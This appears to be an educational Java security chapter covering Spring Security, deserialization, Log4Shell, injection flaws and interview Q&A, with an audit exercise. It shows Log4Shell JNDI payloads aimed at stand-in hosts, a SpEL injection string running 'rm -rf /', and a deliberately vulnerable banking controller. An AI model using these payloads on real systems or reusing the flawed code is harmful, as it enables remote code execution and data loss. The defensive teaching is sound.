# ☕ Java Security Deep Dive Q&A — Spring Security, Deserialization & JVM-Specific Vulnerabilities

> *"Java powers 3 billion devices — and 3 billion attack surfaces. From Log4Shell to deserialization gadgets to Spring4Shell, Java has its own unique security landscape. If you're a Java developer, these vulnerabilities aren't theoretical — they're waiting in YOUR codebase. This chapter teaches you Java-specific security patterns that interviewers love to ask about."*

**⏱️ Estimated Time**: 60 minutes | **🎯 Difficulty**: 🟡 Medium → 🔴 Hard | **🔗 Prerequisites**: [Secure Coding Practices](./04_Secure_Coding_Practices_QA.md)

---

## 📋 Table of Contents
1. [Java's Security Landscape](#-javas-security-landscape)
2. [Spring Security Architecture](#-spring-security-architecture)
3. [Java Deserialization Attacks](#-java-deserialization-attacks)
4. [Dependency Vulnerabilities — Log4Shell & Beyond](#-dependency-vulnerabilities--log4shell--beyond)
5. [Spring-Specific Security Patterns](#-spring-specific-security-patterns)
6. [JVM Security Features](#-jvm-security-features)
7. [Secure Random & Cryptography in Java](#-secure-random--cryptography-in-java)
8. [Common Java Security Anti-Patterns](#-common-java-security-anti-patterns)
9. [Gamification: Java Security Audit](#-gamification-java-security-audit)
10. [Interview Q&A — 25 Must-Know Questions](#-interview-qa--25-must-know-questions)
11. [What's Next](#-whats-next)

---

## ☕ Java's Security Landscape

```
╔══════════════════════════════════════════════════════════════════╗
║           JAVA'S GREATEST SECURITY HITS (HALL OF SHAME)          ║
╠══════════════════════════════════════════════════════════════════╣
║                                                                  ║
║  🔥 Log4Shell (2021) - CVE-2021-44228                           ║
║     → JNDI injection in log4j-core → Remote Code Execution      ║
║     → Affected virtually EVERY Java application on Earth         ║
║     → CVSS: 10.0 (maximum severity)                             ║
║                                                                  ║
║  🔥 Spring4Shell (2022) - CVE-2022-22965                        ║
║     → Data binding on JDK 9+ with Tomcat → RCE                  ║
║     → Class loader manipulation via request parameters           ║
║                                                                  ║
║  🔥 Apache Commons Collections Deserialization (2015)            ║
║     → Java deserialization gadget chains → RCE                   ║
║     → Led to WebLogic, JBoss, Jenkins breaches                   ║
║                                                                  ║
║  🔥 Java Applet/Sandbox Escapes (2012-2013)                     ║
║     → Multiple sandbox bypass CVEs → drove death of Applets     ║
║                                                                  ║
║  🔥 Spring Security Auth Bypass (2022) - CVE-2022-22978         ║
║     → RegexRequestMatcher bypass via newline in URL              ║
║                                                                  ║
║  PATTERN: Java's rich ecosystem = massive dependency tree        ║
║           = enormous attack surface via transitive dependencies  ║
╚══════════════════════════════════════════════════════════════════╝
```

---

## 🏰 Spring Security Architecture

> 🎮 **Analogy**: Spring Security is like an airport security checkpoint. Every passenger (request) must pass through multiple checkpoints in order: ID verification (authentication) → boarding pass check (authorization) → luggage scan (input validation). You can add more checkpoints (filters), but the ORDER matters.

### The Filter Chain — How It Really Works

```
HTTP Request → Servlet Container (Tomcat)
                     │
                     ▼
         ┌───────────────────────┐
         │ DelegatingFilterProxy │  ← Bridge to Spring
         └───────────┬───────────┘
                     ▼
         ┌───────────────────────┐
         │ FilterChainProxy      │  ← Manages security filter chains
         └───────────┬───────────┘
                     ▼
    ┌─────────────────────────────────────────┐
    │         SECURITY FILTER CHAIN            │
    │                                          │
    │  1. SecurityContextPersistenceFilter     │  ← Load/save SecurityContext
    │  2. CsrfFilter                          │  ← Validate CSRF tokens
    │  3. LogoutFilter                        │  ← Handle /logout
    │  4. UsernamePasswordAuthenticationFilter │  ← Form login
    │  5. BearerTokenAuthenticationFilter     │  ← JWT/OAuth2
    │  6. ExceptionTranslationFilter          │  ← Convert security exceptions
    │  7. FilterSecurityInterceptor           │  ← Final authorization check
    │                                          │
    └─────────────────────────────────────────┘
                     │
                     ▼
              Controller / Service (your code)
```

### Modern Spring Security Configuration (Spring Boot 3+)

```java
@Configuration
@EnableWebSecurity
@EnableMethodSecurity  // Enable @PreAuthorize, @Secured
public class SecurityConfig {

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            // ✅ Stateless API — disable sessions and CSRF (using JWT)
            .sessionManagement(session -> session
                .sessionCreationPolicy(SessionCreationPolicy.STATELESS))
            .csrf(csrf -> csrf.disable())  // Safe because we use JWT, not cookies
            
            // ✅ Authorization rules — most specific first!
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/api/public/**").permitAll()
                .requestMatchers("/api/admin/**").hasRole("ADMIN")
                .requestMatchers("/api/users/**").hasAnyRole("USER", "ADMIN")
                .requestMatchers("/actuator/health").permitAll()
                .requestMatchers("/actuator/**").hasRole("ACTUATOR")
                .anyRequest().authenticated()  // ✅ Default DENY
            )
            
            // ✅ JWT authentication
            .oauth2ResourceServer(oauth2 -> oauth2
                .jwt(jwt -> jwt.jwtAuthenticationConverter(jwtAuthConverter())))
            
            // ✅ Security headers
            .headers(headers -> headers
                .contentSecurityPolicy(csp -> csp
                    .policyDirectives("default-src 'self'"))
                .frameOptions(frame -> frame.deny()))
            
            // ✅ Exception handling — don't leak details
            .exceptionHandling(ex -> ex
                .authenticationEntryPoint((req, res, e) -> 
                    res.sendError(401, "Authentication required"))
                .accessDeniedHandler((req, res, e) -> 
                    res.sendError(403, "Access denied")));
        
        return http.build();
    }

    // ✅ Password encoder — bcrypt with strength 12
    @Bean
    public PasswordEncoder passwordEncoder() {
        return new BCryptPasswordEncoder(12);
    }
}
```

### Method-Level Security

```java
@Service
public class OrderService {

    // ✅ Only admins can delete orders
    @PreAuthorize("hasRole('ADMIN')")
    public void deleteOrder(Long orderId) { ... }

    // ✅ Users can only view their own orders
    @PreAuthorize("#userId == authentication.principal.id")
    public List<Order> getUserOrders(Long userId) { ... }

    // ✅ Complex authorization with SpEL
    @PreAuthorize("hasRole('ADMIN') or @orderSecurity.isOwner(#orderId, authentication)")
    public Order getOrder(Long orderId) { ... }

    // ✅ Filter return value — only return authorized items
    @PostFilter("filterObject.owner == authentication.name")
    public List<Document> getAllDocuments() { ... }
}

// Custom security expression
@Component("orderSecurity")
public class OrderSecurityEvaluator {
    public boolean isOwner(Long orderId, Authentication auth) {
        Order order = orderRepo.findById(orderId).orElseThrow();
        return order.getUserId().equals(((UserPrincipal) auth.getPrincipal()).getId());
    }
}
```

---

## 💀 Java Deserialization Attacks

> 🎮 **Analogy**: Java serialization is like shipping a box where the unpacking instructions are INSIDE the box. If an attacker swaps the instructions for "destroy everything when opened," the receiver blindly follows them. The act of OPENING (deserializing) the box executes the attacker's code.

### How It Works

```
NORMAL SERIALIZATION:
  Object → byte stream → transmit → byte stream → Object
  The class's readObject() method is called during deserialization
  
ATTACK:
  Attacker crafts a malicious byte stream containing a "gadget chain"
  When deserialized, the chain of object reconstructions executes arbitrary code
  
  Gadget chain example (simplified):
    ObjectInputStream.readObject()
      → HashSet.readObject() 
        → HashMap.put()
          → TiedMapEntry.hashCode()
            → LazyMap.get()
              → ChainedTransformer.transform()
                → InvokerTransformer.transform()
                  → Runtime.exec("calc.exe") 🚨 ARBITRARY CODE EXECUTION!

WHERE IT'S FOUND:
  → RMI (Remote Method Invocation)
  → JMX (Java Management Extensions)
  → Custom protocols using ObjectInputStream
  → Session serialization in application servers
  → Caching systems (Memcached, Redis with Java serialization)
  → Message queues receiving serialized objects
```

### Prevention

```java
// ❌ VULNERABLE: Deserializing untrusted data
public Object deserialize(byte[] data) throws Exception {
    ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data));
    return ois.readObject();  // 🚨 Executes attacker's code!
}

// ✅ FIX 1: Don't use Java serialization for untrusted data — use JSON
// Jackson/Gson only deserialize data — they don't execute code
ObjectMapper mapper = new ObjectMapper();
MyDTO dto = mapper.readValue(jsonString, MyDTO.class);

// ✅ FIX 2: If Java serialization unavoidable — use ObjectInputFilter (Java 9+)
public Object safeDeserialize(byte[] data) throws Exception {
    ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data));
    // Only allow specific classes to be deserialized
    ois.setObjectInputFilter(filterInfo -> {
        Class<?> clazz = filterInfo.serialClass();
        if (clazz != null) {
            // Allowlist: only these classes can be deserialized
            if (clazz == MyAllowedClass.class || clazz == String.class) {
                return ObjectInputFilter.Status.ALLOWED;
            }
            return ObjectInputFilter.Status.REJECTED;  // Everything else blocked
        }
        return ObjectInputFilter.Status.UNDECIDED;
    });
    return ois.readObject();
}

// ✅ FIX 3: Global JVM-level filter (Java 17+)
// In JVM args: -Djdk.serialFilter=com.myapp.**;java.base/**;!*
// Allows only your classes and java.base — blocks all gadget libraries

// ✅ FIX 4: Remove gadget libraries from classpath
// Remove commons-collections 3.x, or upgrade to 4.x (gadgets removed)
// Remove spring-beans-invoker if not needed
```

### Jackson Deserialization Pitfalls

```java
// ❌ DANGEROUS: Enabling default typing (polymorphic deserialization)
ObjectMapper mapper = new ObjectMapper();
mapper.enableDefaultTyping(); // 🚨 NEVER DO THIS!
// Allows attacker to specify ANY class to instantiate via JSON:
// {"@class": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl", ...}

// ❌ ALSO DANGEROUS: @JsonTypeInfo without allowlist
@JsonTypeInfo(use = JsonTypeInfo.Id.CLASS) // 🚨 Any class can be specified!
public abstract class Animal { }

// ✅ SAFE: Explicit subtypes only
@JsonTypeInfo(use = JsonTypeInfo.Id.NAME)
@JsonSubTypes({
    @JsonSubTypes.Type(value = Dog.class, name = "dog"),
    @JsonSubTypes.Type(value = Cat.class, name = "cat")
})
public abstract class Animal { }

// ✅ SAFE: Activate Jackson's default typing with safe settings (2.10+)
ObjectMapper mapper = new ObjectMapper();
mapper.activateDefaultTyping(
    mapper.getPolymorphicTypeValidator(),
    ObjectMapper.DefaultTyping.NON_FINAL,
    JsonTypeInfo.As.PROPERTY
);
// Use BasicPolymorphicTypeValidator to allowlist specific base types
```

---

## 🔥 Dependency Vulnerabilities — Log4Shell & Beyond

### Log4Shell — The Anatomy of a Catastrophe

```
THE ATTACK (CVE-2021-44228, December 2021):

  1. Attacker sends request with malicious string:
     User-Agent: ${jndi:ldap://attacker.com/exploit}
     
  2. Application logs the User-Agent (as most apps do):
     log.info("Request from: {}", request.getHeader("User-Agent"));
     
  3. Log4j 2.x performs JNDI lookup on the string:
     → Connects to attacker's LDAP server
     → Downloads malicious Java class
     → Executes the class (REMOTE CODE EXECUTION!)
     
  4. Attacker now has shell access to your server.

WHY IT WAS SO BAD:
  → Log4j is used by virtually every Java application
  → LOGGING user input is considered safe — nobody expected it to execute code
  → The vulnerability was in a "convenience feature" (message lookup)
  → Trivially exploitable — just put the string in ANY logged field
  → CVSS 10.0 — maximum possible severity
  → Variants bypassed initial patches: ${jndi:ldap://x} → ${${lower:j}ndi:...}

TIMELINE:
  Nov 24: Alibaba reports to Apache
  Dec 9:  Public disclosure (zero-day, already being exploited)
  Dec 10: Entire internet scanning for vulnerable systems
  Dec 11: Patch released (2.15.0) — but bypasses found!
  Dec 14: More patches (2.16.0)
  Dec 17: Yet more patches (2.17.0)
```

### How to Protect Yourself

```xml
<!-- 1. Know your dependencies -->
<!-- Run: mvn dependency:tree | grep log4j -->
<!-- You might have log4j transitively through spring-boot, elasticsearch-client, etc. -->

<!-- 2. Use dependencyManagement to force safe versions -->
<dependencyManagement>
    <dependencies>
        <dependency>
            <groupId>org.apache.logging.log4j</groupId>
            <artifactId>log4j-core</artifactId>
            <version>2.21.1</version>  <!-- Always latest patched -->
        </dependency>
    </dependencies>
</dependencyManagement>

<!-- 3. Automated scanning in CI/CD -->
<!-- pom.xml: OWASP Dependency-Check plugin -->
<plugin>
    <groupId>org.owasp</groupId>
    <artifactId>dependency-check-maven</artifactId>
    <version>9.0.0</version>
    <configuration>
        <failBuildOnCVSS>7</failBuildOnCVSS>  <!-- Fail build on HIGH+ vulnerabilities -->
    </configuration>
</plugin>
```

---

## 🌱 Spring-Specific Security Patterns

### IDOR Prevention Pattern

```java
// ❌ VULNERABLE TO IDOR:
@GetMapping("/orders/{orderId}")
public Order getOrder(@PathVariable Long orderId) {
    return orderRepo.findById(orderId).orElseThrow();
    // Any authenticated user can view ANY order by guessing IDs!
}

// ✅ SECURE: Ownership verification
@GetMapping("/orders/{orderId}")
public Order getOrder(@PathVariable Long orderId, @AuthenticationPrincipal UserPrincipal user) {
    Order order = orderRepo.findById(orderId)
        .orElseThrow(() -> new ResponseStatusException(HttpStatus.NOT_FOUND));
    
    if (!order.getUserId().equals(user.getId()) && !user.hasRole("ADMIN")) {
        throw new ResponseStatusException(HttpStatus.NOT_FOUND); // 404, not 403 (don't confirm existence)
    }
    return order;
}

// ✅ EVEN BETTER: Query-level enforcement
@Query("SELECT o FROM Order o WHERE o.id = :orderId AND o.userId = :userId")
Optional<Order> findByIdAndUserId(@Param("orderId") Long orderId, @Param("userId") Long userId);
```

### Mass Assignment Prevention

```java
// ❌ VULNERABLE: Binding request directly to entity
@PostMapping("/users/profile")
public User updateProfile(@RequestBody User user) {
    return userRepo.save(user); 
    // Attacker sends: {"name":"Alice", "role":"ADMIN", "balance":999999}
    // All fields get updated! 💀
}

// ✅ SECURE: Use a DTO with only allowed fields
public record ProfileUpdateDTO(
    @NotBlank @Size(max = 50) String name,
    @Email String email,
    @Size(max = 200) String bio
    // No role, no balance, no id — only what users should change
) {}

@PostMapping("/users/profile")
public UserResponse updateProfile(@Valid @RequestBody ProfileUpdateDTO dto,
                                   @AuthenticationPrincipal UserPrincipal principal) {
    User user = userRepo.findById(principal.getId()).orElseThrow();
    user.setName(dto.name());
    user.setEmail(dto.email());
    user.setBio(dto.bio());
    // Only explicitly mapped fields are updated
    return UserResponse.from(userRepo.save(user));
}
```

### SpEL Injection Prevention

```java
// ❌ VULNERABLE: User input in SpEL expression
@GetMapping("/eval")
public Object evaluate(@RequestParam String expression) {
    ExpressionParser parser = new SpelExpressionParser();
    return parser.parseExpression(expression).getValue();
    // Attacker: ?expression=T(java.lang.Runtime).getRuntime().exec('rm -rf /')
    // → Remote Code Execution! 💀
}

// ✅ FIX: Never allow user-controlled SpEL evaluation
// If dynamic expressions are needed, use a restricted context:
SimpleEvaluationContext context = SimpleEvaluationContext
    .forReadOnlyDataBinding()
    .withInstanceMethods()
    .build();
// SimpleEvaluationContext blocks type references and constructors
```

---

## 🔒 JVM Security Features

### Java Security Manager (Deprecated in Java 17, Removed in Java 24)

```java
// HISTORICAL CONTEXT: Java Security Manager controlled what code could do
// It's gone now, but understanding WHY teaches good security principles

// What it protected against:
//   - File system access (read/write specific paths only)
//   - Network access (connect to specific hosts/ports only)  
//   - System property access
//   - ClassLoader creation
//   - Reflection access to other packages

// MODERN REPLACEMENT: Modular security
// 1. Java modules (JPMS) — encapsulation at module level
// 2. Container isolation (Docker) — OS-level sandboxing
// 3. Process isolation — separate JVM per service
// 4. Network policies (Kubernetes) — network-level access control
```

### Java Records for Immutable Security

```java
// Records are inherently safer for DTOs:
//   ✅ Immutable — can't be tampered with after creation
//   ✅ Final — can't be extended with malicious subclass
//   ✅ No setters — prevents mass assignment
//   ✅ Clear data contract — what you see is what you get

public record PaymentRequest(
    @NotNull @Positive BigDecimal amount,
    @NotBlank @Pattern(regexp = "^[A-Z]{3}$") String currency,
    @NotBlank String recipientId
) {
    // Compact constructor for additional validation
    public PaymentRequest {
        if (amount.compareTo(new BigDecimal("50000")) > 0) {
            throw new IllegalArgumentException("Amount exceeds maximum");
        }
    }
}
```

---

## 🎲 Secure Random & Cryptography in Java

```java
// ❌ INSECURE: Predictable random (DO NOT USE FOR SECURITY!)
Random random = new Random();                    // Seeded from System.nanoTime()
Random random = new Random(System.currentTimeMillis()); // Easily guessable seed!
String token = String.valueOf(random.nextLong()); // Attacker can predict next values

// Why it's dangerous:
// java.util.Random uses LCG (Linear Congruential Generator)
// Given a few outputs, attacker can compute the seed and predict ALL future values
// Tools exist that crack Random seeds in milliseconds

// ✅ SECURE: Cryptographically strong random
SecureRandom secureRandom = SecureRandom.getInstanceStrong();
// Uses /dev/urandom on Linux, platform-specific CSPRNG

// Generate secure token
byte[] tokenBytes = new byte[32]; // 256 bits of entropy
secureRandom.nextBytes(tokenBytes);
String token = Base64.getUrlEncoder().withoutPadding().encodeToString(tokenBytes);

// Generate secure session ID
String sessionId = new BigInteger(130, secureRandom).toString(32);

// Generate secure password reset token
String resetToken = UUID.randomUUID().toString(); // Uses SecureRandom internally
// But better:
String resetToken = Base64.getUrlEncoder().encodeToString(
    SecureRandom.getInstanceStrong().generateSeed(32));
```

---

## 🚫 Common Java Security Anti-Patterns

### The Anti-Pattern Gallery

```java
// 🚨 ANTI-PATTERN 1: String for passwords (lives in memory indefinitely)
String password = "secret123"; // String pool — exists until GC, may never be collected
// ✅ FIX: Use char[] and zero it out
char[] password = "secret123".toCharArray();
try {
    authenticate(password);
} finally {
    Arrays.fill(password, '\0'); // Clear from memory
}

// 🚨 ANTI-PATTERN 2: SQL concatenation with Hibernate
@Query(value = "SELECT * FROM users WHERE name = '" + name + "'", nativeQuery = true)
// ✅ FIX: Use parameters
@Query(value = "SELECT * FROM users WHERE name = :name", nativeQuery = true)
List<User> findByName(@Param("name") String name);

// 🚨 ANTI-PATTERN 3: Catching and swallowing security exceptions
try {
    checkPermission(user, resource);
} catch (AccessDeniedException e) {
    // Silently ignore — "let them through anyway"  ← DISASTER
}
// ✅ FIX: Let security exceptions propagate (or handle appropriately)

// 🚨 ANTI-PATTERN 4: Trusting thread-local authentication
// In async/reactive code, SecurityContext might not propagate!
@Async
public void processInBackground() {
    // SecurityContextHolder.getContext() might be EMPTY here!
    Authentication auth = SecurityContextHolder.getContext().getAuthentication();
    // auth could be null → bypass authorization checks
}
// ✅ FIX: Propagate security context to async threads
@Bean
public TaskExecutor taskExecutor() {
    ThreadPoolTaskExecutor executor = new ThreadPoolTaskExecutor();
    executor.setTaskDecorator(new DelegatingSecurityContextTaskDecorator());
    return executor;
}

// 🚨 ANTI-PATTERN 5: Using .permitAll() too broadly
.requestMatchers("/**").permitAll() // Everything is public! 💀
// ✅ FIX: Default deny, explicitly permit specific paths
.anyRequest().authenticated() // Default: must be authenticated
.requestMatchers("/api/public/**", "/health").permitAll() // Explicit exceptions

// 🚨 ANTI-PATTERN 6: Comparing objects with == instead of .equals()
if (userRole == "ADMIN") { ... } // String interning makes this unreliable!
// ✅ FIX:
if ("ADMIN".equals(userRole)) { ... } // Safe from null + correct comparison
```

---

## 🎮 Gamification: Java Security Audit

### 🏰 Mission: Secure the Banking Service

> **Scenario**: You're auditing a Spring Boot banking microservice. Find all security issues in this codebase. Each vulnerability found earns points.

```java
@RestController
@RequestMapping("/api/accounts")
public class AccountController {

    @Autowired
    private JdbcTemplate jdbcTemplate;
    
    private static final Logger log = LoggerFactory.getLogger(AccountController.class);

    // Endpoint 1: Login
    @PostMapping("/login")
    public ResponseEntity<?> login(@RequestBody Map<String, String> credentials) {
        String email = credentials.get("email");
        String password = credentials.get("password");
        
        log.info("Login attempt: email={}, password={}", email, password);
        
        String sql = "SELECT * FROM users WHERE email = '" + email + "' AND password = '" + password + "'";
        List<Map<String, Object>> users = jdbcTemplate.queryForList(sql);
        
        if (users.isEmpty()) {
            return ResponseEntity.status(401).body("User not found");
        }
        
        String token = String.valueOf(new Random().nextLong());
        return ResponseEntity.ok(Map.of("token", token));
    }

    // Endpoint 2: Get account
    @GetMapping("/{accountId}")
    public ResponseEntity<?> getAccount(@PathVariable Long accountId) {
        String sql = "SELECT * FROM accounts WHERE id = " + accountId;
        Map<String, Object> account = jdbcTemplate.queryForMap(sql);
        return ResponseEntity.ok(account); // Returns all columns including internal fields
    }

    // Endpoint 3: Transfer
    @PostMapping("/transfer")
    public ResponseEntity<?> transfer(@RequestBody Map<String, Object> request) {
        Long fromAccount = Long.valueOf(request.get("from").toString());
        Long toAccount = Long.valueOf(request.get("to").toString());
        BigDecimal amount = new BigDecimal(request.get("amount").toString());
        
        Map<String, Object> account = jdbcTemplate.queryForMap(
            "SELECT balance FROM accounts WHERE id = " + fromAccount);
        BigDecimal balance = (BigDecimal) account.get("balance");
        
        if (balance.compareTo(amount) >= 0) {
            jdbcTemplate.update("UPDATE accounts SET balance = balance - " + amount + " WHERE id = " + fromAccount);
            jdbcTemplate.update("UPDATE accounts SET balance = balance + " + amount + " WHERE id = " + toAccount);
        }
        
        return ResponseEntity.ok("Transfer complete");
    }
}
```

<details>
<summary>🔍 Find ALL vulnerabilities (aim for 15+) — Click to reveal</summary>

| # | Vulnerability | Line | Severity | Points |
|---|---|---|---|---|
| 1 | Password logged in plaintext | `log.info(...password...)` | 🔴 Critical | 10 |
| 2 | SQL Injection in login | String concat in SQL | 🔴 Critical | 10 |
| 3 | Passwords stored in plaintext | `password = '...'` comparison | 🔴 Critical | 10 |
| 4 | Predictable token generation | `new Random().nextLong()` | 🔴 Critical | 10 |
| 5 | User enumeration | "User not found" (reveals email existence) | 🟡 Medium | 5 |
| 6 | No authentication on getAccount | No `@AuthenticationPrincipal` | 🔴 High | 8 |
| 7 | IDOR on getAccount | No ownership check | 🔴 High | 8 |
| 8 | SQL Injection in getAccount | String concat | 🔴 Critical | 10 |
| 9 | Information disclosure | Returns ALL columns | 🟡 Medium | 5 |
| 10 | No authentication on transfer | No auth check | 🔴 Critical | 10 |
| 11 | SQL Injection in transfer | String concat (3 places) | 🔴 Critical | 10 |
| 12 | Race condition (TOCTOU) | Check balance → deduct not atomic | 🔴 High | 8 |
| 13 | No input validation | No amount limits, no null checks | 🟡 Medium | 5 |
| 14 | No CSRF protection | POST without CSRF token | 🟡 Medium | 5 |
| 15 | No rate limiting | Brute force possible | 🟡 Medium | 5 |
| 16 | No audit logging | Transfer without audit trail | 🟡 Medium | 5 |
| 17 | No transaction management | Transfer not atomic (partial failure) | 🟡 Medium | 5 |
| 18 | Negative amount possible | No `amount > 0` check | 🟡 Medium | 5 |

**Total possible: 134 points**

**Rating**:
- 100+ points found: 🏆 Security Expert
- 70-99 points: 🛡️ Security Engineer  
- 40-69 points: 🔰 Security Aware
- <40 points: 📚 Keep Learning!
</details>

---

## 🎯 Interview Q&A — 25 Must-Know Questions

### Spring Security (Q1-Q10)

**Q1: How does Spring Security's filter chain work?**

> **A**: Spring Security uses a chain of servlet filters that process every request in order. Key filters: (1) SecurityContextPersistenceFilter loads/saves the security context, (2) Authentication filters (UsernamePassword, Bearer Token) verify credentials, (3) ExceptionTranslationFilter converts security exceptions to HTTP responses, (4) AuthorizationFilter (formerly FilterSecurityInterceptor) makes the final access decision. Each filter can either pass the request to the next filter, or short-circuit with a 401/403 response.

**Q2: What's the difference between `@Secured`, `@PreAuthorize`, and `@RolesAllowed`?**

> **A**: `@Secured("ROLE_ADMIN")`: Spring-specific, only supports role checks, no SpEL. `@RolesAllowed("ADMIN")`: JSR-250 standard, same limitations as @Secured. `@PreAuthorize("hasRole('ADMIN') and #userId == principal.id")`: Most powerful — supports SpEL expressions, can reference method parameters, call custom beans. Always prefer `@PreAuthorize` for complex authorization logic. All require `@EnableMethodSecurity`.

**Q3: How would you implement JWT authentication in Spring Boot?**

> **A**: (1) Add `spring-boot-starter-oauth2-resource-server`, (2) Configure `SecurityFilterChain` with `.oauth2ResourceServer(jwt -> jwt.jwtAuthenticationConverter(...))`, (3) Set `spring.security.oauth2.resourceserver.jwt.issuer-uri` or `jwk-set-uri`, (4) Spring automatically validates JWT signature, expiry, issuer. For custom claims: implement `JwtAuthenticationConverter` to extract roles/permissions. Stateless: `SessionCreationPolicy.STATELESS`. Disable CSRF for stateless APIs.

**Q4: How do you prevent IDOR vulnerabilities in Spring Boot?**

> **A**: (1) Always verify the authenticated user owns/has access to the requested resource, (2) Use query-level enforcement: `WHERE id = :id AND userId = :currentUser`, (3) Never trust path variables alone — `@PathVariable Long id` must be coupled with ownership check, (4) Use `@PreAuthorize` with custom security evaluators: `@PreAuthorize("@security.isOwner(#id)")`, (5) Return 404 (not 403) for resources the user shouldn't know exist.

**Q5: Explain CSRF protection in Spring Security. When can you safely disable it?**

> **A**: Spring Security generates a unique CSRF token per session, includes it in forms, and validates it on state-changing requests. You can safely disable CSRF when: (1) API uses stateless token authentication (JWT in Authorization header) — not cookies, (2) No browser clients (machine-to-machine only). CSRF exploits automatic cookie attachment — if you don't use cookies for auth, CSRF is not applicable. If you use cookie-based sessions, keep CSRF enabled.

**Q6: How does Spring Security handle password storage?**

> **A**: `PasswordEncoder` interface with `BCryptPasswordEncoder` as the recommended implementation. Spring 5+ uses `DelegatingPasswordEncoder` which supports multiple algorithms via prefix: `{bcrypt}$2a$12$...`, `{argon2}...`. On registration: `encoder.encode(rawPassword)`. On login: `encoder.matches(rawPassword, storedHash)`. Never store plaintext. Migration: `DelegatingPasswordEncoder` allows gradual migration from old algorithms by detecting the prefix.

**Q7: What is SecurityContext and how is it propagated in async/reactive code?**

> **A**: `SecurityContext` holds the `Authentication` object (current user). Stored in `ThreadLocal` via `SecurityContextHolder`. Problem: in `@Async` methods or `CompletableFuture`, a new thread has no SecurityContext. Fix: (1) Use `DelegatingSecurityContextRunnable/Callable`, (2) Configure `SecurityContextHolder.MODE_INHERITABLETHREADLOCAL`, (3) Use `DelegatingSecurityContextTaskDecorator` on thread pools. In reactive (WebFlux): SecurityContext is in the Reactor Context, propagated via `ReactorContextWebFilter`.

**Q8: How do you secure Spring Boot Actuator endpoints?**

> **A**: By default, only `/health` and `/info` are exposed. Secure configuration: (1) In production, expose minimally: `management.endpoints.web.exposure.include=health,info,prometheus`, (2) Require authentication: include actuator paths in SecurityFilterChain, (3) Use a separate port for actuator (management port) accessible only from internal network, (4) Disable sensitive details: `management.endpoint.health.show-details=never`, (5) Disable environment/beans/configprops endpoints (leak secrets).

**Q9: What is Spring Security's `@WithMockUser` and how do you test security?**

> **A**: `@WithMockUser(roles="ADMIN")` creates a mock authentication for testing secured endpoints without a full auth flow. Testing patterns: (1) `@WithMockUser` for role-based tests, (2) `@WithUserDetails("username")` to load a real UserDetails, (3) Custom annotations for complex scenarios, (4) `mockMvc.perform(get("/admin").with(csrf()))` for CSRF-protected endpoints. Test both positive (authorized access works) AND negative (unauthorized access is blocked) cases.

**Q10: How would you implement rate limiting in Spring Boot?**

> **A**: Options: (1) Spring Cloud Gateway RateLimiter (Redis-backed, distributed), (2) Bucket4j with Spring Boot starter (token bucket algorithm), (3) Resilience4j rate limiter, (4) Custom filter with Redis/Caffeine cache. Implementation: key by (userId for authenticated, IP for anonymous), configure limits (e.g., 100 req/min), return 429 with Retry-After header. For distributed systems: Redis-backed counters ensure consistency across instances.

### Java-Specific Security (Q11-Q20)

**Q11: Explain Java deserialization attacks. How do you prevent them?**

> **A**: Java deserialization (`ObjectInputStream.readObject()`) can execute arbitrary code via "gadget chains" — sequences of method calls triggered during object reconstruction. Libraries like commons-collections provide gadget classes. Prevention: (1) Never deserialize untrusted data — use JSON/protobuf instead, (2) If unavoidable: use `ObjectInputFilter` (Java 9+) with allowlist, (3) Remove gadget libraries (upgrade commons-collections to 4.x), (4) Use `serialVersionUID` and implement `readObject()` carefully, (5) Consider Google's Serialization Firewall.

**Q12: What was Log4Shell and what did it teach us about dependency security?**

> **A**: Log4Shell (CVE-2021-44228): Log4j 2.x processed JNDI lookups in log messages. Attacker sends `${jndi:ldap://evil.com/exploit}` in any logged field → log4j connects to attacker's server → downloads and executes malicious class. Lessons: (1) Even "boring" libraries (logging) can have critical vulns, (2) Transitive dependencies are invisible risks, (3) Automated dependency scanning is essential, (4) Have an incident response plan for zero-days, (5) Defense in depth: egress filtering would have blocked the JNDI connection.

**Q13: What are the security implications of Java reflection?**

> **A**: Reflection can bypass access controls: access private fields/methods, invoke constructors, modify final fields. Security risks: (1) Access internal state of security objects, (2) Bypass encapsulation in security-sensitive code, (3) Invoke methods that should be restricted. Mitigations: In JPMS (Java 9+), modules must explicitly export/open packages. `setAccessible(true)` respects module boundaries. For security-critical code: check `SecurityManager` (deprecated) or use sealed classes and records to limit subclassing.

**Q14: How does Java's `SecureRandom` differ from `Random`?**

> **A**: `Random` uses LCG (Linear Congruential Generator) — predictable. Given ~2 consecutive outputs, attacker can determine the seed and predict all future values. `SecureRandom` uses platform CSPRNG (/dev/urandom on Linux, Windows CNG). Outputs are cryptographically unpredictable — even observing all previous outputs doesn't help predict the next. Use `SecureRandom` for: session IDs, tokens, keys, salts, IVs, any security-sensitive randomness. Performance difference is negligible for typical usage.

**Q15: What is the Spring4Shell vulnerability and how was it exploited?**

> **A**: CVE-2022-22965: On JDK 9+ with Tomcat, Spring's data binding could be exploited via `class.module.classLoader` property chain to modify Tomcat's logging configuration → write a web shell (JSP file) to disk → achieve RCE. Conditions: JDK 9+, WAR deployment on Tomcat, Spring MVC with data binding. Fix: Spring added a denylist for dangerous property paths. Lesson: data binding on complex objects is risky — use DTOs with specific fields, not broad entity binding.

**Q16: How do you secure WebSocket connections in Spring?**

> **A**: (1) Authenticate on handshake (HTTP upgrade request passes through SecurityFilterChain), (2) Use `wss://` (WebSocket over TLS) — never `ws://`, (3) Validate Origin header to prevent cross-site WebSocket hijacking, (4) Authorize subscription channels: `@MessageMapping` with `@PreAuthorize`, (5) Input validate all incoming messages, (6) Rate limit messages per connection, (7) Set maximum message size. Spring STOMP: use `ChannelInterceptor` for message-level authorization.

**Q17: How does Spring handle SQL injection prevention with JPA/Hibernate?**

> **A**: JPA/Hibernate use parameterized queries by default: (1) JPQL: `@Query("SELECT u FROM User u WHERE u.email = :email")` — `:email` is a parameter, (2) Criteria API: all values are parameters, (3) Spring Data method names: `findByEmail(String email)` — auto-parameterized. DANGER ZONES: (1) Native queries with string concatenation: `@Query(value = "..." + input, nativeQuery = true)`, (2) Dynamic JPQL with `EntityManager.createQuery(dynamicString)`, (3) Hibernate's `createSQLQuery` with concatenation. Always use `setParameter()`.

**Q18: What are the security considerations for Spring Boot auto-configuration?**

